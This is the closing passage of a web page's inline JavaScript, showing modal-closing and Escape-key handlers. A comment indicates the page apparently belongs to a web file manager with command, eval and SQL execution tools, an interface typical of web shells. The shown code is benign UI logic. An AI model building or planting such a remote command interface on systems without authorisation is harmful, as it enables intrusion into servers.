                    if (focusEl) focusEl.focus();
                }, 50);
            })
            .catch(err => {
                document.body.style.cursor = '';
                console.error('[SPA Modal] fetch error:', err);
                isModalOpen = false;
                blockRefresh = false;
                updateRTIndicator();
            });
    }

    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') {
            // Close SPA file modal (view/edit/rename/etc.) if open
            let m = document.getElementById('_spa_modal');
            if (m) {
                m.style.opacity = '0';
                m.style.transition = 'opacity 0.15s';
                setTimeout(() => { if (m) m.remove(); }, 150);
                isModalOpen = false;
                blockRefresh = false;
                updateRTIndicator();
                let base = window.location.pathname;
                let dir = new URLSearchParams(window.location.search).get('dir');
                history.replaceState(null, '', base + (dir ? '?dir=' + encodeURIComponent(dir) : ''));
                return;
            }
            // Close tools modal (cmd/eval/sql/etc.) if open
            let tm = document.getElementById('tools_modal');
            if (tm && tm.style.display !== 'none') {
                closeToolModal();
            }
        }
    });
</script>
</body>

</html>